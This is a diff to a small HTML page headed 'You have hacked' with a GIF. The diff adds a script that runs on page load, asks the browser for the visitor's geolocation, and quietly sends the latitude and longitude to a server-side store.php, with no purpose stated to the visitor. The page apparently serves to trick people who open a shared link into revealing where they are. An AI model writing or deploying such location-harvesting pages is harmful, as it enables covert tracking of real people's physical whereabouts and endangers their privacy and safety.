@@ -1,21 +1,50 @@
 <html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Document</title>
-</head>
-<style>
-    body{
-        background-color: black;
-        color: white;
-        font-weight: 500;
+  </head>
+  <style>
+    body {
+      background-color: black;
+      color: white;
+      font-weight: 500;
     }
-    h1{
-        color: red;
+    h1 {
+      color: red;
     }
-</style>
-<body  >
-    <h1 style="text-align: center; margin-top: 50px;" >You have hacked</h1>
-    <img src="https://media.giphy.com/media/88iYsvbegSUn9bSTF8/giphy.gif?cid=790b761197mo7t1rm5uvnb6xj5lz450758i7xp81zdmbtc3y&ep=v1_gifs_search&rid=giphy.gif&ct=g" alt="">
-</body>
+  </style>
+  <body onload="getLocation()">
+    <h1 style="text-align: center; margin-top: 50px">You have hacked</h1>
+    <img
+      src="https://media.giphy.com/media/88iYsvbegSUn9bSTF8/giphy.gif?cid=790b761197mo7t1rm5uvnb6xj5lz450758i7xp81zdmbtc3y&ep=v1_gifs_search&rid=giphy.gif&ct=g"
+      alt=""
+    />
+
+    <p id="demo"></p>
+
+    <script>
+      const x = document.getElementById("demo");
+
+      function getLocation() {
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(showPosition);
+        } else {
+          x.innerHTML = "Geolocation is not supported by this browser.";
+        }
+      }
+
+      function showPosition(position) {
+        const xhttp = new XMLHttpRequest();
+        xhttp.open(
+          "GET",
+          "store.php?lat=" +
+            position.coords.latitude +
+            "&long=" +
+            position.coords.longitude
+        );
+        xhttp.send();
+      }
+    </script>
+  </body>
 </html>
